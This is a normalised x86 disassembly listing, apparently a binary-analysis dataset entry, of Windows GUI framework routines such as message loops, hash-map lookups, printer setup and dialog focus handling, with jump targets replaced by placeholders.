push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_421616
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41a622
mov eax sub_426704
call sub_40cc20
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
push edi
mov [ ebp - 0x10 ] esp
push esi
push [ ebp + 0xc ]
call sub_421725
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] esi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41a67b
mov eax sub_426710
call sub_40cc20
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] esp
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi [ ecx + 0x20 ]
cmp esi edi
jne r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_4217b5
push [ ebp + 0x14 ]
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
call [ eax + 0x28 ]
mov ecx [ ebp + 0x18 ]
cmp ecx edi
je r-xdata
mov eax 0x80004001
jmp r-xdata
cmp [ ebp + 0xc ] edi
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ecx + 0x4 ] edi
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
sub_41a75a
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_41a8db
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_41a7a3
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ esi + 0x10 ] ecx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax ] ecx
inc [ esi + 0xc ]
and [ eax + 0x8 ] 0x0
pop esi
retn 0x8
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_41a8bb
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_41a814
push esi
mov esi ecx
push 0x0
push [ esi + 0x8 ]
call sub_41a7a3
mov ecx [ esp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] eax
mov [ ecx ] eax
jmp r-xdata
mov [ esi + 0x8 ] eax
pop esi
retn 0x4
sub_41a83d
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_41a7fb
mov eax esi
pop esi
retn
sub_41a861
mov eax [ esp + 0x4 ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov esi [ eax ]
mov [ edx ] esi
mov edx [ eax ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
cmp eax [ ecx + 0x8 ]
jne r-xdata
push eax
call sub_41a7fb
pop esi
retn 0x4
sub_41a898
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
cmp ecx [ esp + 0x4 ]
jne r-xdata
test eax eax
je r-xdata
jmp r-xdata
retn 0x8
sub_41a934
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_41b82f
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_41b806
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_40cc70
add esp 0x10
pop edi
sub_41a979
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_41a8db
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_41b82f
and [ esi + 0x4 ] 0x0
pop ecx
sub_41a9cd
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_41a8bb
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_41aa33
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_41aa65
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_41aa98
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_41aa33
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_41a9cd
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_41a934
sub_41aae8
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_41aa1a
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_41ab2a
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_41aba2
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx esi
call sub_41ae0f
pop esi
retn
call sub_42219b
test eax eax
je r-xdata
push 0x0
call sub_425a0d
sub_41abc4
push esi
push edi
mov edi ecx
call sub_403ba6
mov esi eax
xor eax eax
push eax
push eax
push 0x36a
mov [ edi + 0x84 ] eax
push [ esi + 0x1c ]
call [ PostMessageA@IAT ]
push [ esp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ esp + 0x10 ]
call [ eax + 0x6c ]
pop edi
pop esi
retn 0x8
sub_41abfb
mov edx [ esp + 0x8 ]
push esi
mov eax [ edx + 0x4 ]
mov esi eax
dec esi
je r-xdata
push edx
push [ esp + 0xc ]
call sub_41b0ce
sub esi 0xe
je r-xdata
push ebx
xor ebx ebx
push edi
cmp eax 0x111
mov edi 0xf108
jne r-xdata
mov esi [ esp + 0x10 ]
push r--data
mov ecx esi
call sub_41f5a3
test eax eax
je r-xdata
cmp [ edx + 0xc ] ebx
jne r-xdata
push r--data
mov ecx esi
call sub_41f5a3
test eax eax
jne r-xdata
mov eax [ esi ]
push edi
push 0x1030
jmp r-xdata
push 0x1
pop ebx
inc edi
mov eax ebx
pop edi
pop ebx
jmp r-xdata
mov eax [ esi ]
push edi
push 0x10
mov ecx esi
call [ eax + 0x10 ]
pop esi
retn 0x8
sub_41ac72
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jg r-xdata
cmp edi 0x1
jne r-xdata
push edi
call sub_41aeeb
mov ecx [ esi + 0x80 ]
and [ ebp + 0x8 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
cmp edi 0x1
pop edi
pop esi
setl al
pop ebp
retn 0x4
push edi
mov ecx esi
call sub_41aeeb
mov eax [ ecx ]
call [ eax + 0x10 ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ esi + 0x80 ]
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0x14 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x88 ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
sub_41acdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_42141c
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_42141c
mov [ esi + 0x94 ] edi
sub_41ad9e
call sub_422d64
cmp [ eax + 0x14 ] 0x0
jne r-xdata
retn
push esi
call sub_422b32
mov esi eax
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_41b0f3
push 0xffffffff
call [ SetWindowsHookExA@IAT ]
push sub_422775
mov ecx rw-data
mov [ esi + 0x30 ] eax
call sub_42360a
mov esi eax
cmp [ esi + 0x14 ] 0x0
je r-xdata
push sub_42278a
mov ecx rw-data
call sub_423575
pop esi
call sub_422d64
push [ eax + 0x8 ]
call [ esi + 0x14 ]
sub_41ae0f
push ecx
push ebx
push ebp
push esi
push edi
push 0x1
xor ebx ebx
mov esi ecx
pop edi
mov [ esp + 0x10 ] ebx
mov eax [ esi ]
mov ecx esi
call [ eax + 0x5c ]
test eax eax
je r-xdata
lea ebp [ esi + 0x30 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi ]
lea ebp [ esi + 0x30 ]
push ebp
mov ecx esi
call [ eax + 0x64 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esi ]
inc [ esp + 0x10 ]
push eax
mov ecx esi
call [ edx + 0x60 ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
push 0x1
mov [ esp + 0x14 ] ebx
pop edi
cmp edi ebx
jne r-xdata
xor edi edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
cmp edi ebx
je r-xdata
sub_41ae8e
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax + 0x4 ]
cmp esi 0x200
je r-xdata
mov edx [ eax + 0x14 ]
mov edi [ eax + 0x18 ]
cmp [ ecx + 0x5c ] edx
jne r-xdata
cmp esi 0xa0
je r-xdata
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x18 ]
mov [ ecx + 0x5c ] edx
mov [ ecx + 0x60 ] esi
mov eax [ eax + 0x4 ]
mov [ ecx + 0x64 ] eax
cmp [ ecx + 0x60 ] edi
jne r-xdata
cmp esi 0xf
je r-xdata
cmp esi [ ecx + 0x64 ]
je r-xdata
xor eax eax
jmp r-xdata
cmp esi 0x118
jne r-xdata
pop edi
pop esi
retn 0x4
push 0x1
pop eax
sub_41aeeb
push ebx
push ebp
xor ebp ebp
push esi
cmp [ esp + 0x10 ] ebp
push edi
jg r-xdata
call sub_422d64
add eax 0x1070
push sub_42267f
mov ecx eax
call sub_423575
cmp [ eax + 0x10 ] ebp
jne r-xdata
mov edi [ ecx + 0x1c ]
mov ebx 0x363
cmp edi ebp
je r-xdata
xor eax eax
cmp [ esp + 0x14 ] ebp
pop edi
pop esi
pop ebp
pop ebx
setl al
retn 0x4
call sub_41f74d
push 0x1
call sub_41f756
call sub_422d64
add eax 0x1070
push sub_42267f
mov ecx eax
call sub_423575
mov esi [ eax + 0x8 ]
mov eax [ edi + 0x1c ]
cmp eax ebp
je r-xdata
cmp [ esi + 0x1c ] ebp
je r-xdata
push eax
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov esi [ esi + 0x54 ]
jmp r-xdata
cmp esi edi
je r-xdata
push ebp
push 0x1
pop esi
push esi
push ebx
push [ edi + 0x1c ]
push edi
call sub_41ca0a
push esi
push esi
push ebp
push esi
push ebx
push [ edi + 0x1c ]
call sub_41e161
cmp esi ebp
je r-xdata
cmp [ esi + 0x88 ] ebp
jne r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
push ebp
mov ecx esi
call sub_41f2d2
push ebp
push 0x1
push ebx
push [ esi + 0x1c ]
push esi
call sub_41ca0a
push 0x1
push 0x1
push ebp
push 0x1
push ebx
push [ esi + 0x1c ]
call sub_41e161
cmp [ esi + 0x88 ] ebp
jl r-xdata
or [ esi + 0x88 ] 0xffffffff
push eax
mov ecx esi
call sub_41f2d2
mov eax [ esi + 0x88 ]
cmp eax ebp
jle r-xdata
sub_41aff6
push ecx
mov eax [ ecx ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] ecx
call [ eax + 0x28 ]
mov esi eax
xor ebp ebp
cmp esi ebp
je r-xdata
xor eax eax
mov ebx [ esp + 0x18 ]
mov edi 0xc000
mov eax [ esi + 0x4 ]
push ebp
push ebp
push edi
push ebp
push ebp
push eax
push [ esi + 0x4 ]
call sub_41d8d6
cmp eax ebp
jne r-xdata
mov esi [ esi ]
cmp esi ebp
jne r-xdata
mov ecx [ eax + 0x10 ]
mov ecx [ ecx ]
cmp ecx [ ebx + 0x4 ]
je r-xdata
push [ ebx + 0xc ]
mov ecx [ esp + 0x14 ]
push [ ebx + 0x8 ]
call [ eax + 0x14 ]
push 0x1
pop eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp eax edi
jae r-xdata
jmp r-xdata
push ebp
push ebp
push edi
add eax 0x18
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
push eax
call sub_41d8d6
cmp eax ebp
je r-xdata
sub_41b071
push esi
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
jne r-xdata
call sub_403ba6
mov esi eax
test esi esi
je r-xdata
push edi
call sub_41aff6
test eax eax
jne r-xdata
push edi
push eax
call sub_41e20e
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn 0x4
xor eax eax
push [ edi ]
call sub_41cbcb
mov ecx eax
call sub_41e07f
cmp eax esi
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x90 ]
jmp r-xdata
sub_41b0ce
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax 0x1
jne r-xdata
cmp eax 0xf
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push 0x0
push [ ecx ]
call [ ValidateRect@IAT ]
retn 0x8
sub_41b0f3
push esi
call sub_422d64
cmp [ eax + 0x14 ] 0x0
mov esi [ esp + 0x8 ]
jne r-xdata
push sub_422741
mov ecx rw-data
call sub_423575
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push esi
push [ eax + 0x30 ]
call [ CallNextHookEx@IAT ]
test esi esi
jge r-xdata
call sub_41ad89
test eax eax
je r-xdata
cmp esi 0x8001
jne r-xdata
push [ esp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push esi
call [ edx + 0x70 ]
jmp r-xdata
pop esi
retn 0xc
sub_41b14b
mov eax [ esp + 0x4 ]
push esi
cmp [ eax + 0x4 ] 0x100
jne r-xdata
xor eax eax
cmp [ eax + 0x8 ] 0x70
jne r-xdata
mov eax [ eax + 0xc ]
shr eax 0x10
test ah 0x40
jne r-xdata
mov esi [ GetKeyState@IAT ]
push 0x10
call esi
test ax ax
jl r-xdata
push 0x11
call esi
test ax ax
jl r-xdata
push 0x12
call esi
test ax ax
jl r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
retn 0x4
sub_41b196
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax ebx
je r-xdata
call sub_403ba6
cmp [ rw-data ] 0x333
mov edi eax
jae r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
push [ esi ]
call sub_41cbcb
cmp eax ebx
je r-xdata
sub eax 0x7fff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] ebx
je r-xdata
push esi
call sub_41b14b
test eax eax
je r-xdata
mov ecx eax
call sub_41e0a7
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
push ebx
push 0xe146
push 0x111
push [ edi + 0x1c ]
jmp r-xdata
mov ecx edi
call sub_41f0d3
test eax eax
je r-xdata
cmp eax 0x108
ja r-xdata
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ edi + 0x50 ] ebx
je r-xdata
push sub_422741
mov ecx rw-data
call sub_423575
mov ebx eax
cmp [ ebx + 0xbc ] 0x0
jne r-xdata
push 0x1
pop eax
jmp r-xdata
call sub_403ba6
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
push 0x7
lea edi [ ebp - 0x20 ]
pop ecx
mov [ ebx + 0xbc ] 0x1
[ edi ] [ esi ]
mov esi [ ebp - 0x4 ]
mov ecx [ esi + 0x20 ]
call sub_41f2f9
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov ecx [ esi + 0x4 ]
cmp ecx 0x100
jne r-xdata
and [ ebx + 0xbc ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x58 ]
test eax eax
je r-xdata
cmp ecx 0x202
jne r-xdata
cmp [ esi + 0x8 ] 0xd
je r-xdata
and [ ebx + 0xbc ] 0x0
push ebx
push 0xe146
push 0x111
push [ eax + 0x1c ]
sub_41b2fb
push esi
mov esi ecx
xor eax eax
push edi
push eax
lea edi [ esi + 0x30 ]
push eax
push eax
push edi
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
retn
cmp [ esi + 0x34 ] 0x36a
je r-xdata
push 0x1
pop eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x58 ]
test eax eax
jne r-xdata
push edi
call [ TranslateMessage@IAT ]
push edi
call [ DispatchMessageA@IAT ]
sub_41b355
mov eax sub_425d1c
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_41b380
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_41b487
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_422d64
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_41d8d6
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_41b380
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_41b5e9
push esi
mov esi ecx
push 0xd
call sub_4238a9
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
test eax eax
je r-xdata
push 0xd
call sub_423919
test esi esi
je r-xdata
mov ecx eax
call sub_422da1
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_41b627
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_41b64d
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_41f314
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41cbcb
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41cbcb
mov ecx eax
call sub_41f33b
mov ecx [ ecx + 0x1c ]
sub_41b6dd
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
